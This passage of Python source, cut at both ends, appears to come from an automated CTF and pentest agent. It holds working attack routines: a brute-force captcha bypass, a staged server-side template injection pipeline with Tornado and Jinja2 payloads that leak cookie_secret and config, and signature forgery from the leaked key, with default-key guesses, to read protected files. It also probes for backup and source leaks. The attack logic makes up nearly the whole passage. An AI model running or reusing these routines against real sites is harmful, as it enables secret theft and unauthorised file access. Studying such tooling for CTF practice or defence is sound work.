        contact_url: str,
        contact_form: dict[str, Any],
        submission: dict[str, str],
        captcha_fields: list[str],
        strategy_kind: str,
        max_guess: int = 81,
    ) -> tuple[dict[str, Any], str, int] | None:
        """Fallback for arithmetic-style captcha when OCR is missing or wrong."""
        if not captcha_fields:
            return None

        base_submission = dict(submission)
        for guess in range(0, max_guess + 1):
            candidate_submission = dict(base_submission)
            for field_name in captcha_fields:
                candidate_submission[field_name] = str(guess)
            response, request_url = await self._submit_form_request(
                contact_url,
                contact_form,
                candidate_submission,
            )
            body = str((response or {}).get("body") or "")
            lowered_body = body.lower()
            invalid_captcha = "invalid captcha" in lowered_body
            submitted_signal = self._is_contact_submission_success(
                response=response,
                body=body,
                final_url=str((response or {}).get("final_url") or request_url or contact_url),
            )
            if submitted_signal:
                return response, request_url, guess
            if not invalid_captcha:
                if self.state is not None:
                    self.state.add_observation(
                        "contact_captcha_bypass_progress",
                        str(guess),
                        source=strategy_kind,
                        metadata={
                            "contact_url": contact_url,
                            "request_url": request_url,
                            "guess": guess,
                        },
                    )
                return response, request_url, guess
        return None

    def _ssti_exploitation_gated_by_mode(self) -> bool:
        """Whether to withhold specific SSTI exploitation payloads right now.

        Conservative (pentest) mode blocks engine-specific / cookie_secret
        exploitation payloads until a ``{{7*7}}`` probe has confirmed the vuln
        class (recorded as an ``ssti_probe_hit`` observation) — info-gathering
        before exploitation. Aggressive (CTF default) never gates: it takes the
        shortest chain to the flag and fires exploit payloads directly.
        """
        if self.exploitation_mode != "conservative":
            return False
        if self.state is None:
            return False
        return not any(
            str(getattr(obs, "kind", "") or "") == "ssti_probe_hit"
            for obs in self.state.observations
        )

    async def _run_render_parameter_ssti_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
        *,
        strategy_kind: str = "ssti_via_render_parameter",
    ) -> _ChainOutcome:
        """
        Input:  target URL + page_features / state observations
        Output: _ChainOutcome；副作用：写入 render/ssti 观察与 cookie_secret
        Success: 发现 render/msg 参数 SSTI 并泄露 cookie_secret，随后进入 hash 重构
        Failure: render 参数探针全部无效；保留 progress 供上层继续决策
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        progress = False
        reasons: list[str] = []
        baseline_tokens: set[str] = set()

        candidate_urls = self._collect_render_surface_urls(base, page_features)
        if not candidate_urls:
            candidate_urls = [urljoin(base + "/", "error?msg=Error")]
        surface_signature = self._strategy_surface_signature(
            strategy_kind,
            candidate_urls,
        )
        if self._was_strategy_surface_exhausted(
            strategy_kind,
            surface_signature,
        ):
            return _ChainOutcome(
                progress=False,
                reason=f"{strategy_kind} render parameter surface already exhausted",
            )

        try:
            baseline_resp = await self.runtime.proxy_action(
                "get",
                url=urljoin(base + "/", "error?msg=Error"),
                timeout=10,
            )
            if isinstance(baseline_resp, dict) and not baseline_resp.get("error"):
                baseline_body = str(baseline_resp.get("body") or "")
                baseline_plain = re.sub(r"<[^>]+>", " ", baseline_body)
                baseline_tokens = set(
                    re.findall(r"[A-Za-z0-9_@#$%^&*!+\-]{3,}", baseline_plain)
                )
        except Exception:
            pass

        payloads = [
            "{{7*7}}",
            "{{handler.settings}}",
            '{{handler.settings["cookie_secret"]}}',
            '{{handler.settings.get("cookie_secret","")}}',
        ]
        cookie_secret: str | None = None
        response_fingerprints: list[str] = []

        for candidate in candidate_urls:
            for payload in payloads:
                # Conservative mode: the {{7*7}} probe is always allowed, but
                # specific exploitation payloads ({{handler.settings...}}) are
                # withheld until the probe confirms SSTI.
                if payload != "{{7*7}}" and self._ssti_exploitation_gated_by_mode():
                    continue
                probe_url = self._inject_render_payload(candidate, payload)
                try:
                    resp = await self.runtime.proxy_action("get", url=probe_url, timeout=10)
                except Exception:
                    continue
                if not isinstance(resp, dict) or resp.get("error"):
                    continue

                body = str(resp.get("body") or "")
                status = int(resp.get("status_code") or 0)
                final_url = str(resp.get("final_url") or probe_url)
                redirect_history = list(resp.get("redirect_history") or [])
                if not body:
                    continue
                progress = True
                reasons.append(f"render_ssti {urlparse(final_url).path}: status={status}")
                if self.state is not None:
                    self.state.add_observation(
                        "render_ssti_response",
                        body[:500],
                        source=strategy_kind,
                        metadata={
                            "strategy_kind": strategy_kind,
                            "payload": payload,
                            "url": probe_url,
                            "final_url": final_url,
                            "redirect_history": redirect_history,
                            "status_code": status,
                        },
                    )

                flag = self._extract_flag(body)
                if flag:
                    verification = await self._observe_flag(
                        flag,
                        base,
                        evidence_source="response_body",
                        rationale=f"render param SSTI via {probe_url}",
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag,
                            reason=f"render param SSTI flag via {urlparse(final_url).path}",
                        )

                if payload == "{{7*7}}" and "49" in body:
                    reasons.append("render param appears SSTI-capable")
                    # Conservative mode records the probe hit so the gate above
                    # (and the identify strategy) now permits exploitation.
                    if self.exploitation_mode == "conservative" and self.state is not None:
                        self.state.add_observation(
                            "ssti_probe_hit",
                            body[:200],
                            source=strategy_kind,
                            metadata={
                                "strategy_kind": strategy_kind,
                                "payload": payload,
                                "url": probe_url,
                            },
                        )

                await self._scan_and_store(body, base, evidence_source="response_body")
                response_fingerprints.append(self._response_fingerprint(body, status))
                cookie_secret = self._extract_cookie_secret_candidate(
                    body,
                    baseline_tokens=baseline_tokens,
                )
                if cookie_secret:
                    break
            if cookie_secret:
                break

        if cookie_secret and self.state is not None:
            self.state.add_observation(
                "cookie_secret_leaked",
                cookie_secret,
                source=strategy_kind,
                metadata={"method": "render_param_ssti", "strategy_kind": strategy_kind},
            )
            outcome = await self._run_hash_reconstruction_attack_strategy(
                base,
                cookie_secret,
            )
            if outcome.flag:
                return outcome
            reasons.append(
                f"render param leaked cookie_secret ({cookie_secret[:6]}...), hash computed"
            )
        elif progress and len(set(response_fingerprints)) <= 1:
            if self.state is not None:
                await self._record_uniform_failure_surface(
                    response_fingerprints[0] if response_fingerprints else "uniform_failure",
                    source=strategy_kind,
                    metadata={
                        "strategy_kind": strategy_kind,
                        "signature": surface_signature,
                        "candidate_urls": list(candidate_urls),
                        "response_fingerprints": list(response_fingerprints),
                        "reason": "render parameter surface returned uniform blocked responses",
                    },
                )
            self._mark_strategy_surface_exhausted(
                strategy_kind,
                surface_signature,
                candidate_urls=candidate_urls,
                response_fingerprints=response_fingerprints,
            )
            reasons.append("render parameter surface returned uniform blocked responses")

        return _ChainOutcome(progress=progress, reason="; ".join(dict.fromkeys(reasons))[:300])

    async def _run_tornado_ssti_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        return await self._run_render_parameter_ssti_strategy(
            target,
            page_features,
            strategy_kind="tornado_ssti",
        )

    # ------------------------------------------------------------------
    # Phase 7 §5: three-stage SSTI pipeline (Detect → Identify → Exploit)
    # ------------------------------------------------------------------

    async def _run_ssti_probe_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """Phase 7 SSTI Stage 1 — Detect.

        Sends four generic probe payloads ({{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>)
        to the render surface.  Records a ``ssti_probe_hit`` observation when
        "49" appears in any response, and ``render_ssti_response`` for every
        non-empty response (enabling the identify stage precondition).
        If all responses are uniform failures, marks the surface exhausted.
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        candidate_urls = self._collect_render_surface_urls(base, page_features)
        if not candidate_urls:
            candidate_urls = [urljoin(base + "/", "error?msg=Error")]

        surface_signature = self._strategy_surface_signature("ssti_probe", candidate_urls)
        if self._was_strategy_surface_exhausted("ssti_probe", surface_signature):
            return _ChainOutcome(
                progress=False,
                reason="ssti_probe render surface already exhausted",
            )

        probe_payloads = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"]
        probe_hit = False
        any_response = False
        response_fingerprints: list[str] = []

        for candidate in candidate_urls:
            for payload in probe_payloads:
                probe_url = self._inject_render_payload(candidate, payload)
                try:
                    resp = await self.runtime.proxy_action("get", url=probe_url, timeout=10)
                except Exception:
                    continue
                if not isinstance(resp, dict) or resp.get("error"):
                    continue
                body = str(resp.get("body") or "")
                status = int(resp.get("status_code") or 0)
                if not body:
                    continue
                any_response = True
                if self.state is not None:
                    self.state.add_observation(
                        "render_ssti_response",
                        body[:500],
                        source="ssti_probe",
                        metadata={
                            "strategy_kind": "ssti_probe",
                            "payload": payload,
                            "url": probe_url,
                            "status_code": status,
                        },
                    )
                response_fingerprints.append(self._response_fingerprint(body, status))
                if "49" in body:
                    probe_hit = True
                    if self.state is not None:
                        self.state.add_observation(
                            "ssti_probe_hit",
                            payload,
                            source="ssti_probe",
                            metadata={"url": probe_url, "response_snippet": body[:200]},
                        )

        if any_response and not probe_hit and len(set(response_fingerprints)) <= 1:
            if self.state is not None:
                await self._record_uniform_failure_surface(
                    response_fingerprints[0] if response_fingerprints else "uniform_failure",
                    source="ssti_probe",
                    metadata={
                        "strategy_kind": "ssti_probe",
                        "signature": surface_signature,
                        "candidate_urls": list(candidate_urls),
                        "response_fingerprints": list(response_fingerprints),
                        "reason": "ssti probe: render surface returned uniform responses with no '49'",
                    },
                )
            self._mark_strategy_surface_exhausted(
                "ssti_probe",
                surface_signature,
                candidate_urls=candidate_urls,
                response_fingerprints=response_fingerprints,
            )

        reason = (
            "ssti probe hit: '49' found in render response"
            if probe_hit
            else (
                "ssti probe: render surface accessible, no '49' detected"
                if any_response
                else "ssti probe: no render surface response"
            )
        )
        return _ChainOutcome(progress=any_response, reason=reason)

    async def _run_ssti_identify_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """Phase 7 SSTI Stage 2 — Identify.

        Runs once per challenge (guarded by ``ssti_identify_attempted``).
        Sends engine-specific probes to the render surface and records
        ``ssti_engine_identified`` with the engine name.  For Tornado,
        also extracts the cookie_secret from the ``{{handler.settings}}``
        response if present, saving the exploit stage an extra request.
        """
        # Conservative mode: do not attempt engine-specific identification (which
        # fires {{handler.settings}} and leaks cookie_secret) until a probe has
        # confirmed SSTI. This skips identify entirely when the probe has no hit.
        if self._ssti_exploitation_gated_by_mode():
            return _ChainOutcome(
                progress=False,
                reason="conservative mode: SSTI not confirmed by probe; identify skipped",
            )
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        candidate_urls = self._collect_render_surface_urls(base, page_features)
        if not candidate_urls:
            candidate_urls = [urljoin(base + "/", "error?msg=Error")]

        engine: str | None = None

        for candidate in candidate_urls:
            # --- Tornado probe: {{handler.settings}} -----------------------
            tornado_url = self._inject_render_payload(candidate, "{{handler.settings}}")
            try:
                resp = await self.runtime.proxy_action("get", url=tornado_url, timeout=10)
            except Exception:
                resp = None
            if isinstance(resp, dict) and not resp.get("error"):
                body = str(resp.get("body") or "")
                status = int(resp.get("status_code") or 0)
                if body and "cookie_secret" in body:
                    engine = "tornado"
                    if self.state is not None:
                        self.state.add_observation(
                            "render_ssti_response",
                            body[:500],
                            source="ssti_identify",
                            metadata={
                                "strategy_kind": "ssti_identify",
                                "payload": "{{handler.settings}}",
                                "url": tornado_url,
                                "status_code": status,
                            },
                        )
                        self.state.add_observation(
                            "ssti_engine_identified",
                            "tornado",
                            source="ssti_identify",
                            metadata={"url": tornado_url, "evidence": body[:200]},
                        )
                    # Extract cookie_secret immediately to skip an extra request
                    cookie_secret = self._extract_cookie_secret_candidate(body)
                    if cookie_secret and self.state is not None:
                        self.state.add_observation(
                            "cookie_secret_leaked",
                            cookie_secret,
                            source="ssti_identify",
                            metadata={
                                "method": "handler_settings_probe",
                                "strategy_kind": "ssti_identify",
                            },
                        )
                    break
            # --- Jinja2 probe: {{config}} / context.config -----------------
            for jinja_payload in ("{{config}}", "{{self._TemplateReference__context.config}}"):
                jinja_url = self._inject_render_payload(candidate, jinja_payload)
                try:
                    resp = await self.runtime.proxy_action("get", url=jinja_url, timeout=10)
                except Exception:
                    resp = None
                if not isinstance(resp, dict) or resp.get("error"):
                    continue
                body = str(resp.get("body") or "")
                status = int(resp.get("status_code") or 0)
                if not body:
                    continue
                lowered = body.lower()
                if any(marker in lowered for marker in ("secret_key", "jinja", "config", "flask")):
                    engine = "jinja2"
                    if self.state is not None:
                        self.state.add_observation(
                            "render_ssti_response",
                            body[:500],
                            source="ssti_identify",
                            metadata={
                                "strategy_kind": "ssti_identify",
                                "payload": jinja_payload,
                                "url": jinja_url,
                                "status_code": status,
                            },
                        )
                        self.state.add_observation(
                            "ssti_engine_identified",
                            "jinja2",
                            source="ssti_identify",
                            metadata={"url": jinja_url, "evidence": body[:200]},
                        )
                    break
            if engine == "jinja2":
                break

        # Mark as attempted so this stage does not re-run in subsequent iterations
        if self.state is not None:
            self.state.add_observation(
                "ssti_identify_attempted",
                engine or "no_match",
                source="ssti_identify",
                metadata={"engine": engine},
            )

        return _ChainOutcome(
            progress=engine is not None,
            reason=f"ssti identify: engine={engine}" if engine else "ssti identify: engine not determined",
        )

    async def _run_ssti_exploit_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """Phase 7 SSTI Stage 3 — Exploit.

        Reads the identified engine from ``ssti_engine_identified`` observations.
        For Tornado: uses ``cookie_secret`` already present in state (from identify
        stage) to skip directly to hash reconstruction, or falls back to sending
        explicit ``{{handler.settings[\"cookie_secret\"]}}`` payloads.
        For Jinja2: attempts ``{{config}}`` config-dump exploit.
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)

        # Conservative (pentest) mode: confirm the SSTI vuln class with a {{7*7}}
        # probe before firing exploitation payloads (info-gathering first). Run
        # the probe inline if it hasn't happened; if it still doesn't confirm,
        # withhold exploitation. Aggressive (CTF) mode skips this and exploits
        # directly — the shortest chain to the flag.
        if self.exploitation_mode == "conservative":
            if self._ssti_exploitation_gated_by_mode():
                await self._run_ssti_probe_strategy(target, page_features)
            if self._ssti_exploitation_gated_by_mode():
                return _ChainOutcome(
                    progress=False,
                    reason="conservative mode: SSTI not confirmed by probe; exploit withheld",
                )

        # Retrieve identified engine and any already-extracted cookie_secret
        engine: str | None = None
        cookie_secret: str | None = None
        if self.state is not None:
            for obs in reversed(list(self.state.observations)):
                if obs.kind == "ssti_engine_identified" and engine is None:
                    engine = str(obs.value or "")
                if obs.kind == "cookie_secret_leaked" and cookie_secret is None:
                    cookie_secret = str(obs.value or "")
            if engine and cookie_secret:
                break_early = True
            else:
                break_early = False

        if engine == "tornado":
            # Fast path: cookie_secret already extracted in identify stage
            if cookie_secret:
                outcome = await self._run_hash_reconstruction_attack_strategy(
                    base, cookie_secret
                )
                if outcome.flag:
                    return outcome
            # Slow path: send explicit exploit payloads
            exploit_payloads = [
                '{{handler.settings["cookie_secret"]}}',
                '{{handler.settings.get("cookie_secret","")}}',
            ]
            candidate_urls = self._collect_render_surface_urls(base, page_features)
            if not candidate_urls:
                candidate_urls = [urljoin(base + "/", "error?msg=Error")]
            for candidate in candidate_urls:
                for payload in exploit_payloads:
                    probe_url = self._inject_render_payload(candidate, payload)
                    try:
                        resp = await self.runtime.proxy_action("get", url=probe_url, timeout=10)
                    except Exception:
                        continue
                    if not isinstance(resp, dict) or resp.get("error"):
                        continue
                    body = str(resp.get("body") or "")
                    if not body:
                        continue
                    if self.state is not None:
                        self.state.add_observation(
                            "render_ssti_response",
                            body[:500],
                            source="ssti_exploit",
                            metadata={
                                "strategy_kind": "ssti_exploit",
                                "payload": payload,
                                "url": probe_url,
                            },
                        )
                    flag = self._extract_flag(body)
                    if flag:
                        verification = await self._observe_flag(
                            flag, base, evidence_source="response_body",
                            rationale=f"Tornado SSTI exploit via {probe_url}",
                        )
                        if verification.decision in {"verified", "runtime"}:
                            return _ChainOutcome(
                                progress=True, flag=verification.flag,
                                reason=f"Tornado SSTI flag via {probe_url}",
                            )
                    found_secret = self._extract_cookie_secret_candidate(body)
                    if found_secret:
                        if self.state is not None:
                            self.state.add_observation(
                                "cookie_secret_leaked", found_secret,
                                source="ssti_exploit",
                                metadata={"method": "explicit_payload", "strategy_kind": "ssti_exploit"},
                            )
                        outcome = await self._run_hash_reconstruction_attack_strategy(
                            base, found_secret
                        )
                        if outcome.flag:
                            return outcome
            return _ChainOutcome(
                progress=False, reason="ssti_exploit(tornado): no cookie_secret or flag found"
            )

        elif engine == "jinja2":
            # Jinja2 path: try config dump
            candidate_urls = self._collect_render_surface_urls(base, page_features)
            if not candidate_urls:
                candidate_urls = [urljoin(base + "/", "error?msg=Error")]
            for candidate in candidate_urls:
                for jinja_payload in ["{{config}}", "{{self._TemplateReference__context.config}}"]:
                    probe_url = self._inject_render_payload(candidate, jinja_payload)
                    try:
                        resp = await self.runtime.proxy_action("get", url=probe_url, timeout=10)
                    except Exception:
                        continue
                    if not isinstance(resp, dict) or resp.get("error"):
                        continue
                    body = str(resp.get("body") or "")
                    if not body:
                        continue
                    flag = self._extract_flag(body)
                    if flag:
                        verification = await self._observe_flag(
                            flag, base, evidence_source="response_body",
                            rationale=f"Jinja2 SSTI config dump via {probe_url}",
                        )
                        if verification.decision in {"verified", "runtime"}:
                            return _ChainOutcome(
                                progress=True, flag=verification.flag,
                                reason="Jinja2 SSTI config dump",
                            )
            return _ChainOutcome(
                progress=False, reason="ssti_exploit(jinja2): no flag found in config dump"
            )

        # Unknown engine — LLM-driven fallback if available
        llm_instance = getattr(self, "llm", None)
        if llm_instance is not None:
            ctx = self._strategy_context(target=target, page_features=page_features, hint="")
            return await self._run_llm_driven_exploration(ctx)
        return _ChainOutcome(
            progress=False,
            reason=f"ssti_exploit: engine='{engine}' not handled, no LLM available",
        )

    async def _run_hash_guarded_file_read_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """
        Input:  target URL + page_features（需有 filename+filehash URL）
        Output: _ChainOutcome；副作用：写入 observations（含 cookie_secret）
        Success: SSTI 泄露 cookie_secret 后计算 hash 拿到 flag
        Failure: SSTI 无效；上层继续

        Secret extraction strategy (3 tiers):
        Tier-1: UUID hex (8-4-4-4-12)
        Tier-2: 32-char pure hex (MD5 format)
        Tier-3: any 4-64 char word token not present in baseline response
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)

        # Conservative (pentest) mode: this strategy leaks cookie_secret via
        # /error?msg={{handler.settings}} SSTI — gate it on a confirmed {{7*7}}
        # probe (info-gathering first). Run the probe inline if needed; if it
        # still doesn't confirm, withhold the cookie_secret leak. Aggressive
        # (CTF) mode exploits directly — the shortest chain to the flag.
        if self.exploitation_mode == "conservative":
            if self._ssti_exploitation_gated_by_mode():
                await self._run_ssti_probe_strategy(target, page_features)
            if self._ssti_exploitation_gated_by_mode():
                return _ChainOutcome(
                    progress=False,
                    reason="conservative mode: SSTI not confirmed by probe; cookie_secret leak withheld",
                )
        progress = False
        reasons: list[str] = []

        # Step 0: 基线请求，提取常见 token 用于后续 diff
        baseline_tokens: set[str] = set()
        try:
            baseline_resp = await self.runtime.proxy_action(
                "get",
                url=urljoin(base + "/", "file") + "?filename=probe_test&filehash=test",
                timeout=10,
            )
            if isinstance(baseline_resp, dict) and not baseline_resp.get("error"):
                baseline_body = str(baseline_resp.get("body") or "")
                baseline_plain = re.sub(r"<[^>]+>", " ", baseline_body)
                baseline_tokens = set(re.findall(r"[A-Za-z0-9_@#$%^&*!+\-]{3,}", baseline_plain))
        except Exception:
            pass

        # Tornado SSTI 注入点：filename 参数或题面暴露的 render/error 参数。
        # easy_tornado 类题常拦截通用 {{7*7}} 和 filename SSTI，但允许
        # /error?msg={{handler.settings}} 泄露 cookie_secret。
        ssti_payloads = [
            "{{handler.settings}}",
            '{{handler.settings["cookie_secret"]}}',
            '{{handler.settings.get("cookie_secret","")}}',
        ]
        _COMMON_SKIP = {
            "html", "body", "head", "title", "div", "span", "script", "style",
            "error", "file", "hash", "test", "probe", "true", "false", "null",
            "http", "https", "filehash", "filename", "handler", "settings",
            "cookie", "secret", "cookie_secret", "Error", "filehash",
            "probe_test",
        }
        cookie_secret: str | None = None

        render_surfaces = self._collect_render_surface_urls(base, page_features)
        surface_signature = self._strategy_surface_signature(
            "hash_guarded_file_read",
            [urljoin(base + "/", "file?filename=<ssti>&filehash=test"), *render_surfaces],
        )
        if self._was_strategy_surface_exhausted("hash_guarded_file_read", surface_signature):
            return _ChainOutcome(
                progress=False,
                reason="hash_guarded_file_read render surface already exhausted",
            )

        for payload in ssti_payloads:
            encoded = quote(payload, safe="")
            probe_urls = [urljoin(base + "/", "file") + f"?filename={encoded}&filehash=test"]
            for render_url in render_surfaces:
                injected = self._inject_render_payload(render_url, payload)
                if injected not in probe_urls:
                    probe_urls.append(injected)

            found_body = ""
            found_url = ""
            for probe_url in probe_urls:
                try:
                    resp = await self.runtime.proxy_action("get", url=probe_url, timeout=10)
                except Exception:
                    continue
                if not isinstance(resp, dict) or resp.get("error"):
                    continue
                body = str(resp.get("body") or "")
                if not body:
                    continue
                final_url = str(resp.get("final_url") or probe_url)
                redirect_history = list(resp.get("redirect_history") or [])
                if redirect_history and final_url and final_url != probe_url and payload not in final_url:
                    replay_url = self._inject_render_payload(final_url, payload)
                    try:
                        replay_resp = await self.runtime.proxy_action("get", url=replay_url, timeout=10)
                    except Exception:
                        replay_resp = {}
                    if isinstance(replay_resp, dict) and not replay_resp.get("error"):
                        replay_body = str(replay_resp.get("body") or "")
                        if replay_body:
                            body = replay_body
                            probe_url = replay_url
                found_body = body
                found_url = probe_url
                break
            if not found_body:
                continue
            progress = True
            reasons.append(f"SSTI probe len={len(found_body)}")
            if self.state is not None:
                self.state.add_observation(
                    "ssti_probe_response",
                    found_body[:300],
                    source="hash_guarded_file_read",
                    metadata={"payload": payload, "url": found_url},
                )
            # 直接看 flag
            flag = self._extract_flag(found_body)
            if flag:
                verification = await self._observe_flag(
                    flag, base, evidence_source="response_body", rationale="hash_guarded SSTI"
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(progress=True, flag=verification.flag, reason="SSTI flag")
            await self._scan_and_store(found_body, base, evidence_source="response_body")

            # 三层提取策略
            plain = re.sub(r"<[^>]+>", " ", found_body)  # 去 HTML 标签

            # 层1：UUID 格式（含 dash）
            uuid_m = re.search(
                r"\b([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})\b",
                plain, re.IGNORECASE,
            )
            if uuid_m:
                cookie_secret = uuid_m.group(1)
                break

            # 层2：32 位纯 hex（MD5 格式），排除基线
            hex32_m = re.search(r"\b([0-9a-f]{32})\b", plain, re.IGNORECASE)
            if hex32_m and hex32_m.group(1) not in baseline_tokens:
                cookie_secret = hex32_m.group(1)
                break

            # 层3：宽松 word 匹配 — 任意 4-64 字符的新 token（不在基线、不是常见词）
            for token in re.findall(r"[A-Za-z0-9_@#$%^&*!+\-]{4,64}", plain):
                if token in baseline_tokens:
                    continue
                if token.lower() in _COMMON_SKIP:
                    continue
                cookie_secret = token
                break
            if cookie_secret:
                break

        if cookie_secret and self.state is not None:
            self.state.add_observation(
                "cookie_secret_leaked",
                cookie_secret,
                source="hash_guarded_file_read",
                metadata={"method": "ssti_injection"},
            )
            outcome = await self._run_hash_reconstruction_attack_strategy(base, cookie_secret)
            if outcome.flag:
                return outcome
            reasons.append(f"cookie_secret obtained ({cookie_secret[:6]}...), hash computed")

        if not cookie_secret and progress:
            self._mark_strategy_surface_exhausted(
                "hash_guarded_file_read",
                surface_signature,
                reason="cookie_secret probes returned no secret",
                surface_count=len(render_surfaces),
            )

        return _ChainOutcome(progress=progress, reason="; ".join(reasons[:3]))

    async def _run_hash_reconstruction_attack_strategy(
        self,
        target: str,
        cookie_secret: str | None = None,
    ) -> _ChainOutcome:
        """Phase 7 §7 (SignSaboteur): 四步泛化签名利用管道。

        1. token-discovery: 从 state 观测中收集 filename+filehash 候选参数
        2. format-inference: 根据 filehash 长度推断 md5 / sha256
        3. key-guess: 优先用传入的 cookie_secret；若无则从 state 中找 cookie_secret_leaked obs
        4. access-check: 重构签名后请求目标资源

        Input:  target URL + 可选 cookie_secret（直接传入时跳过 key-guess 步骤）
        Phase 7 初版支持 md5 和 sha256；JWT 延至 Phase 8。
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        target_files = self._collect_candidate_filenames()

        # ── key-guess: 收集候选密钥 ──────────────────────────────────────
        key_candidates: list[str] = []
        if cookie_secret:
            key_candidates.append(cookie_secret)
        if self.state is not None:
            for obs in self.state.observations:
                if obs.kind == "cookie_secret_leaked":
                    val = str(obs.value or "").strip()
                    if val and val not in key_candidates:
                        key_candidates.append(val)
        # 空密钥和常见默认密钥（通用兜底）
        _COMMON_DEFAULTS = ("", "secret", "mysecret", "tornado_secret")
        for default_key in _COMMON_DEFAULTS:
            if default_key not in key_candidates:
                key_candidates.append(default_key)

        # ── format-inference: 从 state 中找已知的 filehash 值推断格式 ──
        inferred_fmt: str | None = None
        if self.state is not None:
            for obs in self.state.observations:
                if obs.kind == "hash_reconstruction_response":
                    fh = str((obs.metadata or {}).get("hash") or "")
                    fmt = _infer_hash_format(fh)
                    if fmt != "unknown":
                        inferred_fmt = fmt
                        break
        # 尝试从 URL 参数中推断（通过候选文件名 URL 模式）
        if inferred_fmt is None and self.state is not None:
            for obs in self.state.observations:
                disc = _discover_hash_params(str(obs.value or ""))
                if disc.get("filehash"):
                    fmt = _infer_hash_format(disc["filehash"])
                    if fmt != "unknown":
                        inferred_fmt = fmt
                        break

        # 格式优先序：已推断的 > md5（Tornado 默认）> sha256
        fmt_order: list[str] = []
        if inferred_fmt:
            fmt_order.append(inferred_fmt)
        for fallback in ("md5", "sha256"):
            if fallback not in fmt_order:
                fmt_order.append(fallback)

        # ── access-check ─────────────────────────────────────────────────
        for secret_key in key_candidates:
            for fmt in fmt_order:
                for filename in target_files:
                    computed_hash = _compute_signed_hash(secret_key, filename, fmt)
                    if computed_hash is None:
                        continue
                    url = urljoin(base + "/", "file") + f"?filename={filename}&filehash={computed_hash}"
                    try:
                        resp = await self.runtime.proxy_action("get", url=url, timeout=10)
                    except Exception:
                        continue
                    if not isinstance(resp, dict) or resp.get("error"):
                        continue
                    body = str(resp.get("body") or "")
                    status = int(resp.get("status_code") or 0)
                    if self.state is not None:
                        self.state.add_observation(
                            "hash_reconstruction_response",
                            body[:300],
                            source="hash_reconstruction_attack",
                            metadata={
                                "filename": filename,
                                "hash": computed_hash,
                                "hash_format": fmt,
                                "url": url,
                                "status": status,
                            },
                        )
                    if body:
                        await self._scan_and_store(body, base, evidence_source="response_body")
                    flag = self._extract_flag(body)
                    if flag:
                        verification = await self._observe_flag(
                            flag, base,
                            evidence_source="response_body",
                            rationale=f"hash_reconstruction({fmt}): {filename}",
                        )
                        if verification.decision in {"verified", "runtime"}:
                            return _ChainOutcome(
                                progress=True,
                                flag=verification.flag,
                                reason=f"hash_reconstruction({fmt}) flag: {filename}",
                            )

        return _ChainOutcome(progress=False, reason="hash_reconstruction: no flag in target files")

    # ------------------------------------------------------------------

    async def _run_backup_source_leak_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
        hint: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        observed_text = "\n".join(
            str(part)
            for part in (
                page_features.get("content") or "",
                page_features.get("html") or "",
                hint or "",
            )
            if part
        )
        reasons: list[str] = []
        progress = False

        if _BACKUP_CLUE_RE.search(observed_text):
            reasons.append("backup/source clue observed")

        candidate_urls: list[tuple[str, str]] = []
        current_source_blob = "\n".join(
            str(part)
            for part in (
                page_features.get("html") or "",
                page_features.get("content") or "",
            )
            if part
        )
        current_candidate_url = str(page_features.get("url") or target or "").strip() or target
        if current_source_blob and _looks_like_inline_source_leak(current_source_blob):
            reasons.append("inline source leak observed on current page")
            candidate_urls.append((urlparse(current_candidate_url).path or current_candidate_url, current_candidate_url))
        for rel_path in self._recent_source_hint_backup_probe_paths():
            artifact_url = urljoin(base + "/", rel_path.lstrip("/"))
            candidate_urls.append((rel_path, artifact_url))
        for rel_path in (*_COMMON_BACKUP_PATHS, *_DJANGO_STATIC_SOURCE_PROBES):
            artifact_url = urljoin(base + "/", rel_path.lstrip("/"))
            candidate_urls.append((rel_path, artifact_url))
        for raw in list(page_features.get("raw_links") or []):
            absolute = _normalize_exploration_url(str(raw or "").strip())
            if not absolute:
                continue
            lowered = absolute.lower()
            if any(
                token in lowered
                for token in (
                    ".zip",
                    ".tar.gz",
                    ".tgz",
                    ".tar",
                    ".gz",
                    ".bak",
                    ".phps",
                    ".db",
                    ".sqlite",
                    ".wal",
                )
            ):
                candidate_urls.append((urlparse(absolute).path or absolute, absolute))
            elif any(
                lowered.endswith(suffix)
                for suffix in ("/source.php", "/hint.php", "/index.php", "/flag.php", ".phps")
            ):
                candidate_urls.append((urlparse(absolute).path or absolute, absolute))

        seen_candidates: set[str] = set()
        for rel_path, artifact_url in candidate_urls:
            if artifact_url in seen_candidates:
                continue
            seen_candidates.add(artifact_url)
            resp = await self.runtime.proxy_action(
                "get",
                url=artifact_url,
                timeout=12,
            )
            if not isinstance(resp, dict) or resp.get("error"):
                continue

            status_code = int(resp.get("status_code") or 0)
            body = str(resp.get("body") or "")
            if status_code != 200 or not body:
                continue
            if rel_path in _DJANGO_STATIC_SOURCE_PROBES and not _looks_like_python_source_leak(
                rel_path,
                body,
            ):
                continue
            if not _looks_like_backup_source_candidate(rel_path, body, resp.get("headers")):
                continue

            progress = True
            await self._scan_and_store(body, base, evidence_source="source-leak")
            await self._store_note(
                key="ctf_backup_candidate",
                value=f"found backup/source candidate at {artifact_url}",
                category="artifact",
                target=urlparse(base).netloc or base,
                url=artifact_url,
                strategy_kind="backup_source_leak",
            )
            self._emit(f"[CTF dispatcher] backup candidate: {artifact_url}")

            extracted_flag = self._extract_flag(body)
            if extracted_flag:
                verification = await self._observe_flag(
                    extracted_flag,
